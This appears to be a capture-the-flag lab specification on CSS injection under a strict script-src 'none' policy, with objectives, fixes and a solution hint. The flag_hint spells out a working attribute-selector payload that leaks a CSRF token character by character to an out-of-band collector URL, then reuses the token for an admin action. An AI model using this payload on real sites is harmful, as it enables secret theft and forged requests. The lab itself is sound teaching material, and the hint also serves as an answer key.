title: CSS Injection — Exfiltrating a CSRF Token via Attribute Selectors
learning_objectives: Recognise CSS injection as a data-exfiltration primitive even when a strict CSP (script-src 'none') makes JavaScript impossible — an attacker-controlled stylesheet is still dangerous
Use CSS attribute selectors + background-image callbacks to leak a secret held in an ATTRIBUTE: input[name=csrf][value^="prefix"]{background:url(...)} fires only when the value starts with the prefix
Understand this reads only ATTRIBUTE values, never text-node content, and works one character at a time — you extend a known prefix per round, so the leak is inherently sequential
Chain the leaked secret: use the exfiltrated CSRF token to perform the state-changing action it was meant to protect

Apply the fixes: don't render untrusted stylesheets on pages holding secrets; scope/allow-list style-src; keep secrets out of attributes on such pages; a per-request/rotating token blunts a slow character-by-character leak
flag_hint: The staff /preview (admin-only) renders your POST /styles stylesheet under CSP script-src 'none', next to <input name=csrf value="<8 hex>">. Leak it char-by-char: for each position submit rules input[name=csrf][value^="<prefix><c>"]{background:url(http://collector:9000/report?p=<N>&c=<c>)} for c in 0-9a-f; the bot's preview fires the matching char to the collector. Read /oob/received, extend the prefix, repeat 8x, then POST /admin/action {"csrf":"<token>"} and POST /solve.
tech_stack: strict CSP (script-src 'none') on the preview page + attacker-hosted same-origin stylesheet (POST /styles -> /styles.css, no-store)
CSRF token in an <input value> attribute (the CSS attribute-selector exfil target)
inspired_by: The CSS-attribute-selector data-exfiltration technique (Pepe Vila / Masato Kinugawa CSS-injection research, LiveOverflow's char-by-char CSS leak), abstracted for local Docker with a Flask preview app under strict script-src, a same-origin attacker stylesheet, a Playwright admin bot, and an OOB collector
